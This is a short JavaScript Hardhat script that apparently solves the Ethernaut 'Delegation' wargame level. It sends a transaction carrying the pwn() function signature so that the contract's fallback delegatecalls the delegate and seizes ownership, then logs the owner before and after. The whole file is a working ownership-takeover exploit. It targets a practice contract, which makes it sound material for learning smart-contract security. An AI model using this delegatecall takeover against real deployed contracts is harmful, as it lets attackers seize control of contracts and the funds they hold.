const { ethers } = require("hardhat");
const Runner = require("./lib/runner");
const utils = require("./lib/utils");

Runner.run(async (provider, owner) => {
    
    //PLACE THE ETHERNAUT DELEGATION CONTRACT ADDRESS HERE (Ethernaut: contract.adddress)
    const contractAddr = "0xd9290DE8a37481492DCE3eFc79f5d7Dc4817D919";     
    
    const contract = await ethers.getContractAt("Delegation", contractAddr);
    
    console.log("* * * ");
    console.log(`contract owner is ${await contract.owner()}`);
    console.log(`delegate address is ${await provider.getStorageAt(contractAddr, 1)}`);
    
    //send transaction with the call signature for pwn(). it will go to the delegate's 
    // fallback, setting the owner of the calling contract 
    console.log("calling fallback...");
    
    await owner.sendTransaction({
        to: contractAddr,
        from: owner.address, 
        data: utils.encodeFunctionSignature("pwn"),
    });
    
    //verify the new owner 
    console.log(`contract owner is ${await contract.owner()}`);
    console.log("* * * ");
});
